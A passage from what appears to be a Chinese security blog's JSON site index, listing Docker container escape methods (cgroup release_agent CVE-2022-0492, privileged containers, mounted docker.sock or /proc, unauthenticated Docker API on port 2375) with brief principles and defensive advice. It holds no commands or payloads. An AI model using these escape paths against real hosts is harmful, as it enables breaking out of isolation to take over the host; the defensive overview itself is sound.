v1的release_agent功能，通过挂载宿主机cgroup并触发恶意脚本，实现逃逸（需CAP_SYS_ADMIN权能）。\nCVE-2022-0492（cgroup逃逸）\n\n\n\n三、不安全配置导致的逃逸\n错误配置为攻击者提供逃逸路径，非代码漏洞但危害严重。\n\n\n特权容器（–privileged）\n\n原理：启用--privileged标志的容器拥有宿主机所有权限，可直接操作宿主机设备（如挂载/dev/sda1）或加载内核模块突破隔离。\n特权容器逃逸（privileged）\n\n\n\n挂载Docker Socket（/var/run/docker.sock）\n\n原理：容器内挂载宿主机的Docker Socket文件后，攻击者可通过Docker API创建特权容器或直接执行宿主机命令。\n挂载逃逸（Socket）\n\n\n\n挂载逃逸(Procfs)\n\n原理：若将宿主机的/proc目录挂载到容器内，攻击者可利用其core_pattern等机制实现逃逸\n挂载逃逸（Procfs）\n\n\n\nDocker API未授权访问\n\n原理： Docker守护进程若暴露2375端口且无认证，攻击者可远程管理Docker。\nDocker API未授权访问\n\n\n\n四、防御建议\n\n及时更新容器运行时及内核补丁；\n禁用特权容器和危险挂载；\n使用安全沙箱（如gVisor）加强隔离；\n部署eBPF监控工具（如Falco）检测逃逸行为\n\n‍\n","categories":["云安全 阶段总结"]},{"title":"link","url":"/link/index.html","content":"欢迎交换友链~，联系邮箱：kaelth@126.com\n\n先知社区\n\n"},{"title":"categories","url":"/categories/index.html","content":"\n网络安全\n云安全\nSDL建设\n生活记录\n阶段总结\n\n"}]